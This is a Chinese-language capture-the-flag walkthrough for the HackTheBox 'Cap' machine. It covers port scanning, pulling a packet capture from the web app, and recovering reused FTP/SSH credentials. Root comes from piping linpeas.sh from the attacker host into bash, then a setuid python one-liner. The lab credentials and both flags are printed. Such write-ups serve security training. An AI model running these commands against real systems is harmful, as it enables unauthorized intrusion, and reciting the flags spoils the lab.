HackTheBox: Cap
===

## Topic

### Lab
#### HackTheBox: 
https://app.hackthebox.com/machines/Cap

 <img width="345" height="145" alt="image" src="https://github.com/user-attachments/assets/33e72ea4-c64c-4bfd-8abf-e03e80f6faf9" />

1.	開啟VPN連線到HTB，並確認VPN連線的IP。本例的靶機IP為10.10.10.245，VPN IP為10.10.14.29。
 
 <img width="676" height="191" alt="image" src="https://github.com/user-attachments/assets/7e0b00b7-89d1-427f-bd8e-0440a2a3a298" />

2.	對靶機進行掃描，並將確認有開啟的Port放入ports變數
ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
echo $ports

 <img width="673" height="74" alt="image" src="https://github.com/user-attachments/assets/f6671547-961f-46f0-9193-a7170adc371b" />

3.	掃描上個步驟所找到的Port，並查訊更詳細的資料，並存放到cap.txt
nmap -p$ports -Pn -sC -sV -A --script vuln -oN cap.txt 10.10.10.245

 <img width="718" height="161" alt="image" src="https://github.com/user-attachments/assets/9a00f37d-b14a-43b5-9b36-a6c17e6651bc" />

4.	嘗試用匿名帳號嘗試登入FTP，可以得知FTP Sever是利用vsFTPD 3.03架設，並且不開放匿名登入。

 <img width="308" height="189" alt="image" src="https://github.com/user-attachments/assets/805376c0-7f75-4289-9886-f6fdae245419" />

5.	檢視靶機的80 Port，可以看到有一個使用者Nathan登入。

 <img width="570" height="201" alt="image" src="https://github.com/user-attachments/assets/c4063be3-0bda-4862-aee8-750f41615f0b" />

6.	檢視其他選單的按鈕，可以看到Security Snapshot選單，並且可以下載Wireshark PCAP封包檔。因為使用者Nathan還有在登錄系統，也許這個系統會記錄Nathan登入系統時所輸入的帳號及密碼到Wireshark PCAP封包檔。除此之外可以看到系統的資料存放在data目錄。
 
<img width="519" height="201" alt="image" src="https://github.com/user-attachments/assets/aaedc588-839a-4efd-bfa0-7f12b81352f2" />

7.	利用dirb 檢視這個系統有哪些目錄，在此有看到跟封包紀錄有關的目錄data。
dirb http://10.10.10.245

 <img width="403" height="379" alt="image" src="https://github.com/user-attachments/assets/2354e7f2-1f7c-4b67-bfbb-c7dcb1632fd1" />

8.	利用dirb 檢視data目錄有哪些資料，在此可以檢視到有許多採用數字為名的資料夾。也許資料夾中有包含封包的相關資料。

 <img width="468" height="444" alt="image" src="https://github.com/user-attachments/assets/55fdd975-5896-435a-8ade-059e53bc2a91" />

9.	參考下圖指示，切換網址到http://10.10.10.242/data/0，下載封包檔。

 <img width="540" height="228" alt="image" src="https://github.com/user-attachments/assets/8b43d699-20c1-4f0a-af67-09e88f24077d" />

10.	打開封包檔，點選任意一個封包，然後 Follow TCP Stream
 

11.	在檢視TCP封包訊息，可以查到下面幾個資訊

-	FTP伺服器：vsFTPd 3.0.3
-	使用者帳號： nathan
-	密碼：Buck3tH4TF0RM3!

 <img width="255" height="238" alt="image" src="https://github.com/user-attachments/assets/663b578a-c8f5-4b4e-8216-1295225e0a5d" />

12.	因為一般使用者可能會在不同的系統使用相同的帳號及密碼。現在使用這個帳號及密碼登入FTP。並且可以檢視到FTP目錄中有user.txt。

 <img width="563" height="197" alt="image" src="https://github.com/user-attachments/assets/2c636057-112f-4a53-bea2-085ef7de2070" />

13.	下載user.txt後，可以在文件中看到第一個Flag的內容。
f87feef8da86aa4f8885a56c6d04d0bd
 
<img width="285" height="63" alt="image" src="https://github.com/user-attachments/assets/57017ccc-3e18-4e2c-99ee-4c905646d7a5" />

14.	利用步驟11所獲得的帳號及密碼登入到SSH服務

 <img width="531" height="186" alt="image" src="https://github.com/user-attachments/assets/7a00dc24-c322-40cf-9ff5-3a39500e9b3b" />

15.	確認登入的帳號名稱及權限。
 
<img width="467" height="161" alt="image" src="https://github.com/user-attachments/assets/d5e1d59a-312f-4c02-9038-5f9cb599b330" />

16.	下載 LinPEAS Script
wget https://github.com/peass-ng/PEASS-ng/releases/download/20240804-31b931f7/linpeas.sh
 
<img width="673" height="253" alt="image" src="https://github.com/user-attachments/assets/a015b63e-7e40-4e30-a9ee-4b9953c3a467" />

17.	啟動Python HTTP Server
 
<img width="485" height="62" alt="image" src="https://github.com/user-attachments/assets/feefeb66-e90e-4246-b17f-62d6ad084656" />

18.	透過Python HTTP Server，啟用LinPEAS Script，並將檢查結果存放到check.txt，以便以後檢視可能的漏洞資訊。
curl http://10.10.14.29/linpeas.sh | bash > check.txt

 <img width="637" height="93" alt="image" src="https://github.com/user-attachments/assets/84c35daa-e3f5-4823-a3a5-a5ab9a4aef89" />

19.	下載並執行linpeas.sh，可以看到LinPEAS.sh列出可用的漏洞。直接執行 Python 指令就可以提升權限，提升權限後，印出root.txt。
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id && whoami
**12bfd933b27aadc7948d94fc6ab2d1ac**
